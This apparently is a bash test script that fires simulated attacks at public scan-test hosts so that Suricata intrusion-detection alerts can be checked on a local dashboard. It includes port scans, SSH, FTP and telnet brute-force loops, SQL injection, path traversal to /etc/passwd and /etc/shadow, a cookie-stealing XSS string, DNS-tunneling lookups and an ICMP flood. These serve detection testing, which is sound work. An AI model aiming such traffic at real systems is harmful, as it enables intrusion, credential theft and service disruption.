#!/bin/bash

echo "=== Network-Level Attack Simulation ==="
echo "These tests generate actual network traffic that Suricata can inspect"
echo ""

# Get the network interface Suricata is monitoring
INTERFACE=$(ip route | grep default | awk '{print $5}' | head -1)
echo "Network interface: $INTERFACE"
echo ""

# Function to check alerts
check_new_alerts() {
    echo "Checking for new alerts..."
    sleep 3
    curl -s http://localhost:3000/api/suricata/alerts/recent?limit=5 | jq -r '.[] | "\(.timestamp | split("T")[1] | split(".")[0]) | \(.severity) | \(.signature)"' 2>/dev/null
    echo ""
}

# Test 1: ICMP Ping Sweep (Network Reconnaissance)
echo "Test 1: ICMP Ping Sweep"
echo "Scanning local network..."
sudo nmap -sn 192.168.1.1-10 > /dev/null 2>&1 &
check_new_alerts

# Test 2: TCP SYN Scan on external host
echo "Test 2: TCP SYN Scan (Port Scanning)"
echo "Scanning common ports on external host..."
sudo nmap -sS -p 21,22,23,25,80,443,3389,8080 scanme.nmap.org > /dev/null 2>&1 &
check_new_alerts

# Test 3: OS Fingerprinting
echo "Test 3: OS Fingerprinting Attack"
echo "Attempting OS detection..."
sudo nmap -O scanme.nmap.org > /dev/null 2>&1 &
check_new_alerts

# Test 4: UDP Scan
echo "Test 4: UDP Port Scan"
echo "Scanning UDP ports..."
sudo nmap -sU -p 53,161,500 scanme.nmap.org > /dev/null 2>&1 &
check_new_alerts

# Test 5: Aggressive scan with version detection
echo "Test 5: Service Version Detection"
echo "Detecting service versions..."
sudo nmap -sV -p 80,443 scanme.nmap.org > /dev/null 2>&1 &
check_new_alerts

# Test 6: FTP Brute Force Simulation
echo "Test 6: FTP Connection Attempts"
echo "Simulating FTP brute force..."
for i in {1..5}; do
    timeout 1 ftp -n scanme.nmap.org 2>/dev/null <<EOF &
user anonymous
pass test@test.com
quit
EOF
done
check_new_alerts

# Test 7: Telnet Connection Attempts
echo "Test 7: Telnet Connection Attempts"
echo "Attempting telnet connections..."
for i in {1..3}; do
    (echo "admin"; sleep 1; echo "admin"; sleep 1) | timeout 2 telnet scanme.nmap.org 23 2>/dev/null &
done
check_new_alerts

# Test 8: HTTP with Suspicious Patterns
echo "Test 8: HTTP Requests with Attack Patterns"
echo "Sending HTTP requests with malicious patterns..."

# SQL Injection patterns
curl -s "http://testphp.vulnweb.com/artists.php?artist=1' OR '1'='1" > /dev/null 2>&1
curl -s "http://testphp.vulnweb.com/artists.php?artist=1 UNION SELECT NULL,NULL,NULL--" > /dev/null 2>&1

# Directory traversal
curl -s "http://testphp.vulnweb.com/../../etc/passwd" > /dev/null 2>&1
curl -s "http://testphp.vulnweb.com/admin/../../../../../../etc/shadow" > /dev/null 2>&1

# XSS
curl -s "http://testphp.vulnweb.com/search.php?test=<script>alert(document.cookie)</script>" > /dev/null 2>&1

check_new_alerts

# Test 9: Suspicious User Agents
echo "Test 9: Attack Tool User Agents"
echo "Using known attack tool signatures..."
curl -s -A "sqlmap/1.4.7" http://testphp.vulnweb.com/ > /dev/null 2>&1
curl -s -A "Nikto/2.1.6" http://testphp.vulnweb.com/ > /dev/null 2>&1
curl -s -A "w3af.org" http://testphp.vulnweb.com/ > /dev/null 2>&1
curl -s -A "Metasploit RSPEC" http://testphp.vulnweb.com/ > /dev/null 2>&1
check_new_alerts

# Test 10: DNS Tunneling/Exfiltration
echo "Test 10: Suspicious DNS Queries"
echo "Simulating DNS tunneling..."
for subdomain in data1 data2 data3 exfil test; do
    nslookup "${subdomain}.malicious-c2-server.com" 8.8.8.8 > /dev/null 2>&1
    nslookup "${subdomain}.botnet.example.com" 8.8.8.8 > /dev/null 2>&1
done
check_new_alerts

# Test 11: SSH Brute Force
echo "Test 11: SSH Brute Force Simulation"
echo "Multiple failed SSH attempts..."
for user in admin root test user; do
    timeout 2 sshpass -p "wrongpass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=1 ${user}@scanme.nmap.org 2>/dev/null &
done
check_new_alerts

# Test 12: ICMP Flood (small scale)
echo "Test 12: ICMP Flood Test"
echo "Sending rapid ICMP packets..."
sudo ping -f -c 100 scanme.nmap.org > /dev/null 2>&1 &
check_new_alerts

echo "=== All Network Tests Complete ==="
echo ""
echo "Final Statistics:"
curl -s http://localhost:3000/api/suricata/statistics | jq '{
  totalAlerts,
  criticalAlerts,
  highAlerts,
  mediumAlerts,
  lowAlerts,
  alertsLastHour,
  topSignatures: .topSignatures | to_entries | map({signature: .key, count: .value}) | .[0:5]
}' 2>/dev/null

echo ""
echo "Recent Alerts (Last 15):"
curl -s http://localhost:3000/api/suricata/alerts/recent?limit=15 | jq -r '.[] | "\(.timestamp | split("T")[1] | split(".")[0]) | \(.severity) | \(.signature) | \(.sourceIp) -> \(.destIp)"' 2>/dev/null

echo ""
echo "View dashboard: http://localhost:3000"
